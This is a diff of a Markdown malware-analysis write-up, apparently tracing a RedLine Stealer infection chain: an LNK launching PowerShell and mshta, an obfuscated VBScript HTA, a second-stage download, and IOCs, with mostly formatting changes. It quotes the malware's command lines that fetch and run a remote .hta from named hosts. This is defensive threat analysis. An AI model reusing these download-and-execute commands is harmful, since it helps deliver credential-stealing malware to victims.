@@ -48,7 +48,7 @@
 
 - To avoid detection, attackers are using the path (\W*\2\msh*e) instead of the standard path - C:\Windows\System32\mshta.exe.
 
-  Command Line - ***`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \W*\\\*2\\\msh*e ('http'+'://thanhancompany.com/ta/line'+'.hta')`***
+  **Command Line -** ***`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \W*\\\*2\\\msh*e ('http'+'://thanhancompany.com/ta/line'+'.hta')`***
 
   ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/d2256dce-b51b-4bfd-94b0-aa409bafb609)
 
@@ -56,19 +56,17 @@
 
 - The mshta.exe establishes a connection with the URL specified in the LNK file and execute the hta file.
  
-  Command Line - ***`"C:\Windows\System32\mshta.exe" http[://]thanhancompany[.]com[/]ta[/]line[.]hta`***
+  **Command Line -** ***`"C:\Windows\System32\mshta.exe" http[://]thanhancompany[.]com[/]ta[/]line[.]hta`***
 
   ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/4933084e-1cfa-4cb4-af7b-f3018f39fb01)
 
   ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/b2d33313-9731-4fd6-b750-4c146b340612)
 
-- The HTA script uses the VBScript ‘chr’ function to obfuscate by translating ASCII codes into characters (e.g., Chr(65)   represents 'A').
-
--	VBScript often employs the 'chr' function to obfuscate its code, where 'chr' converts Ascii codes to characters e.g. Chr(65) will return 'A'. 
+- The HTA script uses the VBScript ‘chr’ function to obfuscate by translating ASCII codes into characters. VBScript often employs the 'chr' function to obfuscate its code, where 'chr' converts Ascii codes to characters e.g. Chr(65) will return 'A'. 
 
 -	In this script it uses simple subtraction before converting the character to Ascii using chr.
 
-  Reference Link - https://isvbscriptdead.com/vbs-obfuscator/
+  **Reference Link -** https://isvbscriptdead.com/vbs-obfuscator/
  
 -	Two methods can deobfuscate this script:
  
@@ -93,7 +91,7 @@
 
 -	2nd stage PowerShell first opens Blank pdf and after then connects to the below URL and download ReadiLine Stealer and execute it.
 
-   URL – ***`https[://]hiqsolution[.]com`***
+   **URL –** ***`https[://]hiqsolution[.]com`***
 
   ![image](https://github.com/RanjitPatil/RedLine-Infeaction-Chain/assets/43460691/2e102262-fb99-4f81-b5d3-6986cb33dadc)
 
@@ -104,7 +102,7 @@
 
 ## IOC’s :
 
-  IOC Link – AnyRun Report (https://any.run/report/1bf287baf71f2a0872005e73399685df6b3a2b27cb2f27511deb4bdf566fbe67/5a51d459-6caa-47dd-9b27-715ca2ec92bb?_gl=1*cmzv32*_gcl_au*NjY1NzUzNzkuMTY5NzIxMzg3MA..*_ga*MTk4MTUxNzQ0LjE2NzQ4MzE3MjM.*_ga_53KB74YDZR*MTcwMzgzNjIwNy4zNy4xLjE3MDM4Mzg2MTYuMC4wLjA)
+AnyRun Report (https://any.run/report/1bf287baf71f2a0872005e73399685df6b3a2b27cb2f27511deb4bdf566fbe67/5a51d459-6caa-47dd-9b27-715ca2ec92bb?_gl=1*cmzv32*_gcl_au*NjY1NzUzNzkuMTY5NzIxMzg3MA..*_ga*MTk4MTUxNzQ0LjE2NzQ4MzE3MjM.*_ga_53KB74YDZR*MTcwMzgzNjIwNy4zNy4xLjE3MDM4Mzg2MTYuMC4wLjA)
 
 
 ## References :
